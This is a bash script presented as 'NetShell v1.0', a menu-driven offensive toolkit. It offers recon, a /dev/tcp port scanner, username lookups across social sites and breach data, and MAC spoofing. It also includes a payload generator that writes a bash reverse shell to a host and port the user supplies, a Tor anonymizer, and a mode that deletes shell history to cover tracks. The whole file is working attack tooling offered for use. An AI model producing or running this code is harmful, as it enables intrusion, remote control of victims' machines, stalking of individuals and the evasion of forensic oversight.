#!/bin/bash

RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
MAGENTA="\033[1;35m"
CYAN="\033[1;36m"
NC="\033[0m"

function banner() {
    clear
    echo -e "${CYAN}----------------------------------------"
    echo -e "         NetShell v1.0 - Lt_Spl4sh"
    echo -e "----------------------------------------${NC}"
}

function local_recon() {
    echo -e "${GREEN}[*] Hostname: $(hostname)"
    echo -e "[*] Local IP: $(hostname -I)"
    echo -e "[*] Public IP: $(curl -s ifconfig.me)"
    echo -e "[*] MAC Address: $(ip link show | grep ether | awk '{print $2}' | head -n 1)"
    echo -e "[*] OS: $(uname -a)${NC}"
    read -p "Press enter to return to menu..."
}

function arp_scan() {
    echo -e "${YELLOW}[*] Scanning LAN..."
    ip -4 neigh show | grep -v FAILED
    echo -e "${NC}"
    read -p "Press enter to return to menu..."
}

function port_scan() {
    read -p "Target IP: " target
    read -p "Start Port: " start
    read -p "End Port: " end
    echo -e "${YELLOW}[*] Scanning ports $start to $end on $target..."
    for ((port=$start; port<=$end; port++)); do
        timeout 1 bash -c "</dev/tcp/$target/$port" &>/dev/null && echo -e "${GREEN}[+] Port $port is open${NC}"
    done
    read -p "Press enter to return to menu..."
}

function osint_lookup() {
    read -p "Enter username or email: " target
    echo -e "${CYAN}[*] Checking social platforms..."

    declare -A sites=(
        [GitHub]="https://github.com/$target"
        [GitLab]="https://gitlab.com/$target"
        [Twitter]="https://twitter.com/$target"
        [Instagram]="https://instagram.com/$target"
        [TikTok]="https://tiktok.com/@$target"
        [Reddit]="https://reddit.com/user/$target"
        [LinkedIn]="https://www.linkedin.com/in/$target"
    )

    for site in "${!sites[@]}"; do
        url="${sites[$site]}"
        if curl -s --head "$url" | grep -q "200 OK"; then
            echo -e "${GREEN}[+] Found on $site: $url"
        else
            echo -e "${RED}[-] Not found on $site"
        fi
    done

    echo -e "${CYAN}[*] Checking HaveIBeenPwned..."
    curl -s -H "User-Agent: Netshell" "https://haveibeenpwned.com/unifiedsearch/$target" | grep -q "Domain" && echo -e "${GREEN}[+] Breach data exists${NC}" || echo -e "${RED}[-] No breaches found${NC}"
    read -p "Press enter to return to menu..."
}

function mac_spoofer() {
    echo -e "${RED}[!] Root required for MAC spoofing${NC}"
    read -p "Enter interface (e.g., eth0 or wlan0): " iface
    newmac=$(openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/:$//')
    sudo ip link set $iface down
    sudo ip link set $iface address $newmac
    sudo ip link set $iface up
    echo -e "${GREEN}[+] MAC changed to $newmac${NC}"
    read -p "Press enter to return to menu..."
}

function payload_generator() {
    read -p "Enter payload IP (LHOST): " lhost
    read -p "Enter payload Port (LPORT): " lport
    echo -e "${YELLOW}[*] Generating reverse shell payload..."
    payload="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo "$payload" > payload.sh
    chmod +x payload.sh
    echo -e "${GREEN}[+] Payload saved as payload.sh${NC}"
    read -p "Press enter to return to menu..."
}

function vpn_detector() {
    read -p "Enter target IP: " ip
    echo -e "${YELLOW}[*] Checking if $ip is a VPN/Proxy..."
    curl -s "https://ipapi.co/$ip/json/" | jq '.ip, .city, .region, .country_name, .org, .proxy, .hosting, .asn'
    echo -e "${NC}"
    read -p "Press enter to return to menu..."
}

function anonymizer() {
    echo -e "${MAGENTA}[*] Enabling anonymous mode (Tor + MAC spoof)..."
    iface=$(ip route | grep default | awk '{print $5}' | head -n 1)
    newmac=$(openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/:$//')
    sudo ip link set $iface down
    sudo ip link set $iface address $newmac
    sudo ip link set $iface up
    sudo systemctl start tor
    sudo systemctl enable tor
    echo 'socks5 127.0.0.1 9050' > ~/.proxychains.conf
    echo -e "${GREEN}[+] MAC spoofed. Tor started. Use proxychains4 for anonymity.${NC}"
    read -p "Press enter to return to menu..."
}

function disappear_mode() {
    echo -e "${RED}[*] Disabling network interface & clearing traces..."
    iface=$(ip route | grep default | awk '{print $5}' | head -n 1)
    sudo ip link set $iface down
    history -c
    rm -f ~/.bash_history
    echo -e "${GREEN}[+] Disconnected and cleared history${NC}"
    read -p "Press enter to exit..."
    exit
}

function menu() {
    while true; do
        banner
        echo -e "${BLUE}1) Local Recon"
        echo "2) ARP LAN Scanner"
        echo "3) Silent Port Pinger"
        echo "4) OSINT Lookup"
        echo "5) MAC Spoofer"
        echo "6) Payload Generator"
        echo "7) VPN/Proxy Detector"
        echo "8) Anonymizer"
        echo "9) Disappearing Mode"
        echo "0) Exit"
        read -p "Choose: " choice
        case $choice in
            1) local_recon ;;
            2) arp_scan ;;
            3) port_scan ;;
            4) osint_lookup ;;
            5) mac_spoofer ;;
            6) payload_generator ;;
            7) vpn_detector ;;
            8) anonymizer ;;
            9) disappear_mode ;;
            0) echo -e "${RED}Exiting...${NC}"; exit ;;
            *) echo -e "${RED}Invalid option${NC}" ;;
        esac
    done
}

menu
